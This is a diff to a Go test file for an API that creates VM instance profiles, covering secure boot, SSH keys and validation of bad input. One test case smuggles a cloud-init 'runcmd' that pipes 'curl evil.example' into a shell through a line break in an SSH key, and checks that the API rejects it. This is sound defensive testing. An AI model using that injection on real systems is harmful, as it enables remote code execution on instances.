@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"net/http"
 	"net/http/httptest"
+	"reflect"
 	"strings"
 	"testing"
 
@@ -26,7 +27,7 @@ func TestProfilesAreThreeSizes(t *testing.T) {
 		t.Fatalf("items = %+v", body.Items)
 	}
 	for i := range want {
-		if body.Items[i] != want[i] {
+		if !reflect.DeepEqual(body.Items[i], want[i]) {
 			t.Errorf("profile %d = %+v, want %+v", i, body.Items[i], want[i])
 		}
 	}
@@ -305,6 +306,94 @@ func TestMakeAProfileRefusesABadRequest(t *testing.T) {
 	}
 	if code := call(t, e, "POST", "/v1/tenants/ghost/profiles", "admin", `{"name":"web",`+sz+`}`); code != http.StatusNotFound {
 		t.Errorf("a tenant that does not exist: %d", code)
+	}
+}
+
+// A profile carries the secure boot and the SSH keys of an instance, and says only what it was given: the answer shows them, and shows
+// nothing for what the profile does not say.
+func TestMakeAProfileWithTheSecureBootAndTheKeysOfAnInstance(t *testing.T) {
+	const sz = `"cpu":1,"memoryMiB":1024,"diskGiB":10`
+	t.Run("both", func(t *testing.T) {
+		e := newEnv(t)
+		rec := e.do(t, "POST", "/v1/tenants/demo/profiles", "operator", `{"name":"web",`+sz+`,"secureBoot":false,"sshPublicKeys":["`+sshKey+` leo@laptop"]}`)
+		if rec.Code != http.StatusAccepted {
+			t.Fatalf("status %d: %s", rec.Code, rec.Body)
+		}
+		got := e.profiles.created[0]
+		if got.SecureBoot == nil || *got.SecureBoot || len(got.SSHPublicKeys) != 1 {
+			t.Errorf("the store received %+v", got)
+		}
+		var body profileBody
+		mustDecode(t, rec, &body)
+		if body.SecureBoot == nil || *body.SecureBoot || len(body.SSHPublicKeys) != 1 || body.SSHPublicKeys[0] != sshKey+" leo@laptop" {
+			t.Errorf("body = %+v", body)
+		}
+		// one by one and in the list
+		var one profileBody
+		mustDecode(t, e.do(t, "GET", "/v1/tenants/demo/profiles/web", "viewer", ""), &one)
+		if one.SecureBoot == nil || *one.SecureBoot || len(one.SSHPublicKeys) != 1 {
+			t.Errorf("get = %+v", one)
+		}
+	})
+	t.Run("a true secure boot is said as true", func(t *testing.T) {
+		e := newEnv(t)
+		rec := e.do(t, "POST", "/v1/tenants/demo/profiles", "operator", `{"name":"web",`+sz+`,"secureBoot":true}`)
+		var body profileBody
+		mustDecode(t, rec, &body)
+		if body.SecureBoot == nil || !*body.SecureBoot || body.SSHPublicKeys != nil {
+			t.Errorf("body = %+v", body)
+		}
+	})
+	t.Run("neither is absent, not false and not empty", func(t *testing.T) {
+		e := newEnv(t)
+		rec := e.do(t, "POST", "/v1/tenants/demo/profiles", "operator", `{"name":"web",`+sz+`}`)
+		if got := e.profiles.created[0]; got.SecureBoot != nil || got.SSHPublicKeys != nil {
+			t.Errorf("the store received %+v: a setting the request does not give is not sent", got)
+		}
+		for _, field := range []string{"secureBoot", "sshPublicKeys"} {
+			if strings.Contains(rec.Body.String(), field) {
+				t.Errorf("the answer says %s of a profile that does not: %s", field, rec.Body)
+			}
+		}
+	})
+	t.Run("the profiles every tenant has say none", func(t *testing.T) {
+		e := newEnv(t)
+		rec := e.do(t, "GET", "/v1/tenants/demo/profiles/m", "viewer", "")
+		if strings.Contains(rec.Body.String(), "secureBoot") || strings.Contains(rec.Body.String(), "sshPublicKeys") {
+			t.Errorf("body = %s", rec.Body)
+		}
+	})
+}
+
+// The keys are checked as the ones of an instance, by the same function, and a profile has neither nesting nor a network.
+func TestMakeAProfileRefusesBadSettings(t *testing.T) {
+	e := newEnv(t)
+	const sz = `"name":"web","cpu":1,"memoryMiB":1024,"diskGiB":10`
+	keys := make([]string, 21)
+	for i := range keys {
+		keys[i] = `"` + sshKey + ` k` + fmt.Sprint(i) + `"`
+	}
+	for name, tt := range map[string]struct {
+		body string
+		code int
+		want string
+	}{
+		"a bad key":         {`{` + sz + `,"sshPublicKeys":["nope"]}`, http.StatusUnprocessableEntity, "sshPublicKeys[0] must be one line"},
+		"a line break":      {`{` + sz + `,"sshPublicKeys":["` + sshKey + `\nruncmd:\n  - curl evil.example | sh"]}`, http.StatusUnprocessableEntity, "sshPublicKeys[0] must be one line"},
+		"a key twice":       {`{` + sz + `,"sshPublicKeys":["` + sshKey + `","` + sshKey + `"]}`, http.StatusUnprocessableEntity, "sshPublicKeys[1] is given twice"},
+		"21 keys":           {`{` + sz + `,"sshPublicKeys":[` + strings.Join(keys, ",") + `]}`, http.StatusUnprocessableEntity, "at most 20 sshPublicKeys"},
+		"a string for keys": {`{` + sz + `,"sshPublicKeys":"` + sshKey + `"}`, http.StatusBadRequest, "not valid"},
+		"a text for secure": {`{` + sz + `,"secureBoot":"no"}`, http.StatusBadRequest, "not valid"},
+		"nesting":           {`{` + sz + `,"nesting":true}`, http.StatusBadRequest, "unknown field"},
+		"a network":         {`{` + sz + `,"networks":["net"]}`, http.StatusBadRequest, "unknown field"},
+	} {
+		rec := e.do(t, "POST", "/v1/tenants/demo/profiles", "operator", tt.body)
+		if rec.Code != tt.code || !strings.Contains(rec.Body.String(), tt.want) {
+			t.Errorf("%s: status %d: %s, want %d with %q", name, rec.Code, rec.Body, tt.code, tt.want)
+		}
+	}
+	if len(e.profiles.created) != 0 {
+		t.Errorf("something reached the store: %+v", e.profiles.created)
 	}
 }
 
